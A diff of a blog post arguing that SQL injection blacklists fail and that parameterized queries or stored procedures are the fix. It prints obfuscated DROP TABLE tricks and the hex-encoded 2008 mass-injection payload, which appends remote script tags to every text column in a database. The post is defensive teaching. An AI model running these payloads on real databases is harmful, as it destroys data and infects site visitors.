@@ -3,6 +3,7 @@ title: Please don’t use blacklists, use parameterized queries or stored procs 
 author: SQLDenis
 type: post
 date: 2012-04-05T10:55:00+00:00
+ID: 1587
 excerpt: "Every now and then you will hear how some site will use a blacklist to 'protect' themselves against sql injection. Using a blacklist is very foolish because you can't ever think of all the different ways that the bad guys will try to bypass your little&hellip;"
 url: /index.php/datamgmt/datadesign/please-don-t-use-blacklists/
 views:
@@ -27,14 +28,17 @@ Let&#8217;s say you have DROP and DROP TABLE in your list.
 
 What about these two
 
-<pre>PRINT REVERSE('tset ELBAT PORD')
-PRINT convert(VARCHAR(100),0x44524F50205441424C4520746573740000000000)</pre>
+sql
+PRINT REVERSE('tset ELBAT PORD')
+PRINT convert(VARCHAR(100),0x44524F50205441424C4520746573740000000000)
+```
 
 Change PRINT to EXEC() and both will result in DROP TABLE Test
 
 Remember this one?
 
-<pre>DECLARE @S VARCHAR(4000);SET @S=CAST(0x4445434C415245204054205641524348415228323535292C40432056415243484152283235
+sql
+DECLARE @S VARCHAR(4000);SET @S=CAST(0x4445434C415245204054205641524348415228323535292C40432056415243484152283235
 3529204445434C415245205461626C655F437572736F7220435552534F5220464F522053454C45435420
 612E6E616D652C622E6E616D652046524F4D207379736F626A6563747320612C737973636F6C756D6E73
 206220574845524520612E69643D622E696420414E4420612E78747970653D27752720414E442028622E
@@ -46,11 +50,13 @@ Remember this one?
 2B275D29292B27273C736372697074207372633D687474703A2F2F7777772E63686B626E722E636F6D2F
 622E6A733E3C2F7363726970743E27272729204645544348204E4558542046524F4D205461626C655F43
 7572736F7220494E544F2040542C404320454E4420434C4F5345205461626C655F437572736F72204445
-414C4C4F43415445205461626C655F437572736F7220 AS VARCHAR(4000));print @S;</pre>
+414C4C4F43415445205461626C655F437572736F7220 AS VARCHAR(4000));print @S;
+```
 
 That becomes this
 
-<pre>DECLARE @T VARCHAR(255),@C VARCHAR(255) 
+sql
+DECLARE @T VARCHAR(255),@C VARCHAR(255) 
 DECLARE Table_Cursor CURSOR FOR SELECT a.name,b.name 
 FROM sysobjects a,syscolumns b 
 WHERE a.id=b.id AND a.xtype='u' AND (b.xtype=99 OR b.xtype=35 OR b.xtype=231 OR b.xtype=167) 
@@ -59,10 +65,11 @@ OPEN Table_Cursor
 	WHILE(@@FETCH_STATUS=0) 
 	BEGIN 
 --I changed EXEC to PRINT, just in case you are foolish enough to run this
-		PRINT('UPDATE ['+@T+'] SET ['+@C+']=RTRIM(CONVERT(VARCHAR(4000),['+@C+']))+''<script src=http://SomeFakeSite&gt;</script&gt;''') 
+		PRINT('UPDATE ['+@T+'] SET ['+@C+']=RTRIM(CONVERT(VARCHAR(4000),['+@C+']))+''<script src=http://SomeFakeSite></script>''') 
 		FETCH NEXT FROM Table_Cursor INTO @T,@C 
 	END 
-CLOSE Table_Cursor DEALLOCATE Table_Cursor </pre>
+CLOSE Table_Cursor DEALLOCATE Table_Cursor 
+```
 
 That infected millions of pages in 2008, there are still variants of this one today. A blacklist won&#8217;t help you in this case.
 
